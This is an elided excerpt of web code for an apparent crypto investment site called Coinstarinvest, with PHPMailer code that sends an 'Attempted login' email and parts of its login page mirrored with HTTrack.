...
try {
    ...
    //Recipients
    $mail->setFrom('support@coinstarinvest.com', 'Support');
    $mail->addAddress($email);     //Add a recipient               //Name is optional
    
    $mail->addCC('support@coinstarinvest.com');
...
<body style="background-color: #1e2024; padding: 45px;">
    <div>
        <img style="position:relative; left:35%;" src="https://coinstarinvest.com/trade/dashboard/logo.png">
        <h3 style="color: black;">Mail From support@coinstarinvest.com - Attempted login</h3>
    </div>
...
<!-- Mirrored from Coinstarinvest.com/trade/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 08 Jul 2024 19:44:31 GMT -->
...
<head>
    ...
    <meta name="keywords" content="Coinstarinvest">
    <meta name="description" content="Coinstarinvest">
            ...
            <div class="row justify-content-center">
                <div class="col-xl-5 col-lg-8 col-md-12">
                    <div class="auth-content">
                        <div class="logo">
                            <a href="https://Coinstarinvest.com/trade"><img src="../assets/global/images/df5j5Z6oLRzpfQQKe4r4.png" alt=""/></a>
                        </div>
                        <div class="title">
                            <h2> 👋 Welcome Back!</h2>
...
<!-- Mirrored from Coinstarinvest.com/trade/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 08 Jul 2024 19:44:39 GMT -->
</html>
